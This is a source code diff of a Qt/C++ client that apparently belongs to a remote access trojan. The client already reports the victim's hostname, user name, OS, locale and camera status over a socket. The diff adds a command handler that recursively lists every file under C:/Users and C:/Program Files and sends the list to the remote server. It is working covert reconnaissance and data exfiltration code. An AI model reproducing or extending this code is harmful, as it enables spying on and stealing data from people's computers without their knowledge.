@@ -9,11 +9,12 @@ MainWindow::MainWindow(QWidget *parent)
     ClientStartup();
 }
 
+
+
 MainWindow::~MainWindow()
 {
     delete ui;
 }
-
 
 
 void MainWindow::ClientStartup()
@@ -48,6 +49,26 @@ void MainWindow::ClientStartup()
 
                 QByteArray Data = "#getPcInformation:" + QSysInfo::machineHostName().toLatin1() + ":" + QDir::home().dirName().toLatin1() + ":" + "N/A" + ":" + QSysInfo::prettyProductName().toLatin1() + ":" + language.toLatin1() + ":" + country.toLatin1() + ":" + camAnsw.toLatin1();
                 socket->write(Data);
+            }
+
+            if(data == "#getCFileTree")
+            {
+                QString filesData;
+                QDir dir("C:/Users/");
+                QDirIterator iterator(dir.absolutePath(), QDirIterator::Subdirectories);
+                while (iterator.hasNext()) {
+                    QFile file(iterator.next());
+                    filesData.push_back(file.fileName() + "\n");
+                }
+                QDir dir2("C:/Program Files/");
+                QDirIterator iterator2(dir2.absolutePath(), QDirIterator::Subdirectories);
+                while (iterator2.hasNext()) {
+                    QFile file(iterator2.next());
+                    filesData.push_back(file.fileName() + "\n");
+                }
+
+                socket->write("#getCFileTree:" + filesData.toLatin1());
+                socket->waitForBytesWritten();
             }
         });
 
